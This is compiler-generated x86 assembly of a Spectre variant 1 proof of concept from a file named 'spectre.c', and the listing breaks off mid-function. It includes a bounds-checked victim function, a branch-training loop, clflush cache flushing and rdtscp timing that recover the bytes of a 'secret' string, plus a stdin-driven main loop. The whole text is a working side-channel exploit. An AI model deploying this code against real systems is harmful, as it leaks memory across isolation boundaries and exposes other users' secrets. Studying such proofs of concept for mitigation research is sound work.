	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	calll	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb), %eax
	movl	array1_size@GOTOFF(%eax), %ecx
	xorl	%eax, %eax
	cmpl	4(%esp), %ecx
	seta	%al
	retl
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushl	%esi
	.cfi_def_cfa_offset 8
	.cfi_offset %esi, -8
	calll	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb), %eax
	movl	8(%esp), %ecx
	movl	array1_size@GOTOFF(%eax), %edx
	xorl	%esi, %esi
	cmpl	%ecx, %edx
	cmoval	%ecx, %esi
	movzbl	array1@GOTOFF(%eax,%esi), %ecx
	shll	$9, %ecx
	movb	array2@GOTOFF(%eax,%ecx), %cl
	andb	%cl, temp@GOTOFF(%eax)
	popl	%esi
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$28, %esp
	.cfi_def_cfa_offset 48
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	popl	%edi
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb), %edi
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	readMemoryByte.results@GOTOFF(%edi), %eax
	movl	%edi, %ebx
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	$0, 20(%esp)                    # 4-byte Folded Spill
	movl	$999, 8(%esp)                   # 4-byte Folded Spill
                                        # imm = 0x3E7
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_30 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_13 Depth 2
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	array2@GOTOFF(%edi,%eax)
	clflush	array2@GOTOFF+512(%edi,%eax)
	clflush	array2@GOTOFF+1024(%edi,%eax)
	clflush	array2@GOTOFF+1536(%edi,%eax)
	clflush	array2@GOTOFF+2048(%edi,%eax)
	clflush	array2@GOTOFF+2560(%edi,%eax)
	clflush	array2@GOTOFF+3072(%edi,%eax)
	clflush	array2@GOTOFF+3584(%edi,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	8(%esp), %eax                   # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	movl	%edx, %ebp
	movl	%edx, 12(%esp)                  # 4-byte Spill
	xorl	48(%esp), %ebp
	movl	$29, %esi
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%esi, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%esi, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%ebp, %eax
	xorl	12(%esp), %eax                  # 4-byte Folded Reload
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%edi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %esi
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_30 Depth 3
	clflush	array1_size@GOTOFF(%edi)
	movl	$0, 16(%esp)
	movl	16(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_30:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 16(%esp)
	movl	16(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB2_30
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %ebx
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %ebx
	cmpl	$42765, %ebx                    # imm = 0xA70D
	je	.LBB2_12
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	%ebx, %esi
	andl	$255, %esi
	je	.LBB2_11
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%esi, %ebp
	shll	$9, %ebp
	rdtscp
	movl	%eax, 24(%esp)                  # 4-byte Spill
	movl	%edx, 12(%esp)                  # 4-byte Spill
	movzbl	array2@GOTOFF(%edi,%ebp), %eax
	rdtscp
	movl	%ecx, 20(%esp)                  # 4-byte Spill
	subl	24(%esp), %eax                  # 4-byte Folded Reload
	sbbl	12(%esp), %edx                  # 4-byte Folded Reload
	movl	$100, %ecx
	cmpl	%eax, %ecx
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB2_11
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	8(%esp), %eax                   # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	cmpb	array1@GOTOFF(%edi,%edx), %bl
	je	.LBB2_11
# %bb.10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$1, readMemoryByte.results@GOTOFF(%edi,%esi,4)
	jmp	.LBB2_11
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_1 Depth=1
	movl	$-1, %eax
	xorl	%edx, %edx
	leal	readMemoryByte.results@GOTOFF+4(%edi), %esi
	movl	$-1, %ecx
	jmp	.LBB2_13
	.p2align	4, 0x90
.LBB2_20:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%eax, %ecx
	movl	%ebx, %eax
.LBB2_25:                               #   in Loop: Header=BB2_13 Depth=2
	addl	$2, %edx
	addl	$8, %esi
	cmpl	$256, %edx                      # imm = 0x100
	je	.LBB2_26
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_14
# %bb.15:                               #   in Loop: Header=BB2_13 Depth=2
	movl	-4(%esi), %ebx
	cmpl	readMemoryByte.results@GOTOFF(%edi,%eax,4), %ebx
	jge	.LBB2_14
# %bb.16:                               #   in Loop: Header=BB2_13 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_18
# %bb.17:                               #   in Loop: Header=BB2_13 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ecx,4), %ebx
	jl	.LBB2_19
.LBB2_18:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%edx, %ecx
.LBB2_19:                               #   in Loop: Header=BB2_13 Depth=2
	leal	1(%edx), %ebx
	testl	%eax, %eax
	jns	.LBB2_21
	jmp	.LBB2_20
	.p2align	4, 0x90
.LBB2_14:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%eax, %ecx
	movl	%edx, %eax
	leal	1(%edx), %ebx
	testl	%eax, %eax
	js	.LBB2_20
.LBB2_21:                               #   in Loop: Header=BB2_13 Depth=2
	movl	(%esi), %ebp
	cmpl	readMemoryByte.results@GOTOFF(%edi,%eax,4), %ebp
	jge	.LBB2_20
# %bb.22:                               #   in Loop: Header=BB2_13 Depth=2
	testl	%ecx, %ecx
	js	.LBB2_24
# %bb.23:                               #   in Loop: Header=BB2_13 Depth=2
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ecx,4), %ebp
	jl	.LBB2_25
.LBB2_24:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%ebx, %ecx
	jmp	.LBB2_25
	.p2align	4, 0x90
.LBB2_26:                               #   in Loop: Header=BB2_1 Depth=1
	movl	readMemoryByte.results@GOTOFF(%edi,%eax,4), %edx
	movl	readMemoryByte.results@GOTOFF(%edi,%ecx,4), %esi
	leal	(%esi,%esi), %ebx
	addl	$5, %ebx
	cmpl	%ebx, %edx
	jge	.LBB2_29
# %bb.27:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %edx
	orl	%esi, %edx
	je	.LBB2_29
# %bb.28:                               #   in Loop: Header=BB2_1 Depth=1
	movl	8(%esp), %esi                   # 4-byte Reload
	leal	-1(%esi), %edx
	cmpl	$1, %esi
	movl	%edx, 8(%esp)                   # 4-byte Spill
	ja	.LBB2_1
.LBB2_29:
	movl	20(%esp), %edx                  # 4-byte Reload
	xorl	%edx, readMemoryByte.results@GOTOFF(%edi)
	movl	52(%esp), %esi
	movb	%al, (%esi)
	movl	readMemoryByte.results@GOTOFF(%edi,%eax,4), %eax
	movl	56(%esp), %edx
	movl	%eax, (%edx)
	movb	%cl, 1(%esi)
	movl	readMemoryByte.results@GOTOFF(%edi,%ecx,4), %eax
	movl	%eax, 4(%edx)
	addl	$28, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$76, %esp
	.cfi_def_cfa_offset 96
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	popl	%edi
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb), %edi
	movl	stdin@GOT(%edi), %eax
	movl	%eax, 68(%esp)                  # 4-byte Spill
	leal	check@GOTOFF(%edi), %eax
	movl	%eax, 64(%esp)                  # 4-byte Spill
	leal	.L.str.13@GOTOFF(%edi), %eax
	movl	%eax, 60(%esp)                  # 4-byte Spill
	leal	.L.str.1@GOTOFF(%edi), %eax
	movl	%eax, 56(%esp)                  # 4-byte Spill
	leal	array1@GOTOFF(%edi), %eax
	movl	%eax, 36(%esp)                  # 4-byte Spill
	leal	array2@GOTOFF(%edi), %eax
	movl	%eax, 52(%esp)                  # 4-byte Spill
	leal	.L.str.2@GOTOFF(%edi), %eax
	movl	%eax, 48(%esp)                  # 4-byte Spill
	movl	%edi, 12(%esp)                  # 4-byte Spill
	jmp	.LBB3_2
	.p2align	4, 0x90
.LBB3_1:                                #   in Loop: Header=BB3_2 Depth=1
	movl	%edi, %ebx
	calll	getpid@PLT
	xorl	%ecx, %ecx
	movl	64(%esp), %edx                  # 4-byte Reload
	addl	$33, %edx
	setb	%cl
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	pushl	72(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
.LBB3_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_10 Depth 2
                                        #       Child Loop BB3_11 Depth 3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%edi, %ebx
	movl	80(%esp), %eax                  # 4-byte Reload
	pushl	(%eax)
	.cfi_adjust_cfa_offset 4
	calll	getc@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_2 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_1
# %bb.4:                                #   in Loop: Header=BB3_2 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_45
# %bb.5:                                #   in Loop: Header=BB3_2 Depth=1
	movl	secret@GOTOFF(%edi), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	movl	%edi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	68(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	secret@GOTOFF(%edi), %eax
	movl	%eax, %ecx
	subl	36(%esp), %ecx                  # 4-byte Folded Reload
	movl	%ecx, 20(%esp)
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	strlen@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%eax, %esi
	movl	%eax, 16(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	$131072                         # imm = 0x20000
	.cfi_adjust_cfa_offset 4
	pushl	$1
	.cfi_adjust_cfa_offset 4
	pushl	64(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	cmpl	$3, 96(%esp)
	jne	.LBB3_7
# %bb.6:                                #   in Loop: Header=BB3_2 Depth=1
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	movl	%edi, %ebx
	leal	24(%esp), %eax
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	56(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	movl	112(%esp), %esi
	pushl	4(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	36(%esp), %eax                  # 4-byte Reload
	subl	%eax, 20(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.3@GOTOFF(%edi), %eax
	leal	20(%esp), %ecx
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	8(%esi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$12, %esp
	.cfi_adjust_cfa_offset -12
	leal	.L.str.4@GOTOFF(%edi), %eax
	pushl	20(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	28(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %esi
.LBB3_7:                                #   in Loop: Header=BB3_2 Depth=1
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.5@GOTOFF(%edi), %eax
	movl	%edi, %ebx
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, 16(%esp)
	testl	%eax, %eax
	jle	.LBB3_2
# %bb.8:                                #   in Loop: Header=BB3_2 Depth=1
	movl	$0, 40(%esp)                    # 4-byte Folded Spill
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_9:                                #   in Loop: Header=BB3_10 Depth=2
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%edi, %ebx
	pushl	$10
	.cfi_adjust_cfa_offset 4
	calll	putchar@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	16(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, 16(%esp)
	testl	%eax, %eax
	jle	.LBB3_2
.LBB3_10:                               #   Parent Loop BB3_2 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_11 Depth 3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	movl	secret@GOTOFF(%edi), %eax
	movl	40(%esp), %esi                  # 4-byte Reload
	movsbl	(%eax,%esi), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.6@GOTOFF(%edi), %ecx
	movl	%edi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	28(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	addl	$1, %esi
	movl	%esi, 40(%esp)                  # 4-byte Spill
	movl	20(%esp), %eax
	movl	%eax, 72(%esp)                  # 4-byte Spill
	addl	$1, %eax
	movl	%eax, 20(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	readMemoryByte.results@GOTOFF(%edi), %eax
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	$999, 28(%esp)                  # 4-byte Folded Spill
                                        # imm = 0x3E7
	movl	$0, 44(%esp)                    # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB3_11:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_12:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	array2@GOTOFF(%edi,%eax)
	clflush	array2@GOTOFF+512(%edi,%eax)
	clflush	array2@GOTOFF+1024(%edi,%eax)
	clflush	array2@GOTOFF+1536(%edi,%eax)
	clflush	array2@GOTOFF+2048(%edi,%eax)
	clflush	array2@GOTOFF+2560(%edi,%eax)
	clflush	array2@GOTOFF+3072(%edi,%eax)
	clflush	array2@GOTOFF+3584(%edi,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB3_12
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=3
	movl	28(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	movl	%edx, %ebp
	movl	%edx, 24(%esp)                  # 4-byte Spill
	xorl	72(%esp), %ebp                  # 4-byte Folded Reload
	movl	$29, %esi
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%esi, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%esi, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%ebp, %eax
	xorl	24(%esp), %eax                  # 4-byte Folded Reload
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%edi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %esi
	jb	.LBB3_17
.LBB3_15:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_16 Depth 5
	clflush	array1_size@GOTOFF(%edi)
	movl	$0, 32(%esp)
	movl	32(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB3_14
	.p2align	4, 0x90
.LBB3_16:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        #         Parent Loop BB3_15 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 32(%esp)
	movl	32(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB3_16
	jmp	.LBB3_14
	.p2align	4, 0x90
.LBB3_17:                               #   in Loop: Header=BB3_11 Depth=3
	movl	$13, %ebx
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_19 Depth=4
	addl	$167, %ebx
	cmpl	$42765, %ebx                    # imm = 0xA70D
	je	.LBB3_23
.LBB3_19:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movl	%ebx, %ebp
	andl	$255, %ebp
	je	.LBB3_18
# %bb.20:                               #   in Loop: Header=BB3_19 Depth=4
	movl	%ebp, %edi
	shll	$9, %edi
	rdtscp
	movl	%eax, %esi
	movl	%edx, 24(%esp)                  # 4-byte Spill
	movl	12(%esp), %ecx                  # 4-byte Reload
	movzbl	array2@GOTOFF(%ecx,%edi), %eax
	movl	%ecx, %edi
	rdtscp
	movl	%ecx, 44(%esp)                  # 4-byte Spill
	subl	%esi, %eax
	sbbl	24(%esp), %edx                  # 4-byte Folded Reload
	movl	$100, %ecx
	cmpl	%eax, %ecx
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB3_18
# %bb.21:                               #   in Loop: Header=BB3_19 Depth=4
	movl	28(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	cmpb	array1@GOTOFF(%edi,%edx), %bl
	je	.LBB3_18
# %bb.22:                               #   in Loop: Header=BB3_19 Depth=4
	addl	$1, readMemoryByte.results@GOTOFF(%edi,%ebp,4)
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_23:                               #   in Loop: Header=BB3_11 Depth=3
	movl	$-1, %edx
	xorl	%eax, %eax
	movl	12(%esp), %edi                  # 4-byte Reload
	leal	readMemoryByte.results@GOTOFF+4(%edi), %ecx
	movl	$-1, %ebx
	jmp	.LBB3_26
	.p2align	4, 0x90
.LBB3_24:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%ebp, %ebx
	addl	$2, %eax
	addl	$8, %ecx
	cmpl	$256, %eax                      # imm = 0x100
	je	.LBB3_40
.LBB3_26:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	testl	%edx, %edx
	js	.LBB3_31
# %bb.27:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%edx, %ebp
	movl	-4(%ecx), %edx
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ebp,4), %edx
	jge	.LBB3_33
# %bb.28:                               #   in Loop: Header=BB3_26 Depth=4
	testl	%ebx, %ebx
	js	.LBB3_30
# %bb.29:                               #   in Loop: Header=BB3_26 Depth=4
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ebx,4), %edx
	jl	.LBB3_32
.LBB3_30:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%eax, %ebx
	leal	1(%eax), %edx
	testl	%ebp, %ebp
	jns	.LBB3_34
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_31:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%edx, %ebx
	movl	%eax, %ebp
.LBB3_32:                               #   in Loop: Header=BB3_26 Depth=4
	leal	1(%eax), %edx
	testl	%ebp, %ebp
	jns	.LBB3_34
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%ebp, %ebx
	movl	%eax, %ebp
	leal	1(%eax), %edx
	testl	%ebp, %ebp
	js	.LBB3_24
.LBB3_34:                               #   in Loop: Header=BB3_26 Depth=4
	movl	(%ecx), %esi
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ebp,4), %esi
	jge	.LBB3_24
# %bb.35:                               #   in Loop: Header=BB3_26 Depth=4
	testl	%ebx, %ebx
	js	.LBB3_37
# %bb.36:                               #   in Loop: Header=BB3_26 Depth=4
	cmpl	readMemoryByte.results@GOTOFF(%edi,%ebx,4), %esi
	jl	.LBB3_38
.LBB3_37:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%edx, %ebx
.LBB3_38:                               #   in Loop: Header=BB3_26 Depth=4
	movl	%ebp, %edx
	addl	$2, %eax
	addl	$8, %ecx
	cmpl	$256, %eax                      # imm = 0x100
	jne	.LBB3_26
.LBB3_40:                               #   in Loop: Header=BB3_11 Depth=3
	movl	%edx, %esi
	movl	readMemoryByte.results@GOTOFF(%edi,%edx,4), %eax
	movl	readMemoryByte.results@GOTOFF(%edi,%ebx,4), %ecx
	leal	(%ecx,%ecx), %edx
	addl	$5, %edx
	cmpl	%edx, %eax
	jge	.LBB3_43
# %bb.41:                               #   in Loop: Header=BB3_11 Depth=3
	xorl	$2, %eax
	orl	%ecx, %eax
	je	.LBB3_43
# %bb.42:                               #   in Loop: Header=BB3_11 Depth=3
	movl	28(%esp), %ecx                  # 4-byte Reload
	leal	-1(%ecx), %eax
	cmpl	$1, %ecx
	movl	%eax, 28(%esp)                  # 4-byte Spill
	ja	.LBB3_11
.LBB3_43:                               #   in Loop: Header=BB3_10 Depth=2
	movl	44(%esp), %eax                  # 4-byte Reload
	xorl	%eax, readMemoryByte.results@GOTOFF(%edi)
	movl	12(%esp), %eax                  # 4-byte Reload
	movl	readMemoryByte.results@GOTOFF(%eax,%esi,4), %edi
	movl	12(%esp), %eax                  # 4-byte Reload
	movl	readMemoryByte.results@GOTOFF(%eax,%ebx,4), %ebp
	movl	%ebp, %eax
	addl	%ebp, %eax
	cmpl	%eax, %edi
	movl	12(%esp), %eax                  # 4-byte Reload
	leal	.L.str.9@GOTOFF(%eax), %eax
	movl	12(%esp), %ecx                  # 4-byte Reload
	leal	.L.str.8@GOTOFF(%ecx), %ecx
	cmovll	%eax, %ecx
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	movl	20(%esp), %eax                  # 4-byte Reload
	leal	.L.str.7@GOTOFF(%eax), %eax
	movl	%ebx, 32(%esp)                  # 4-byte Spill
	movl	20(%esp), %ebx                  # 4-byte Reload
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%esi, %ecx
	movzbl	%cl, %eax
	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	movl	12(%esp), %edx                  # 4-byte Reload
	leal	.L.str.10@GOTOFF(%edx), %edx
	movl	12(%esp), %ebx                  # 4-byte Reload
	pushl	%edi
	movl	16(%esp), %edi                  # 4-byte Reload
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	testl	%ebp, %ebp
	jle	.LBB3_9
# %bb.44:                               #   in Loop: Header=BB3_10 Depth=2
	movl	24(%esp), %ecx                  # 4-byte Reload
	movzbl	%cl, %eax
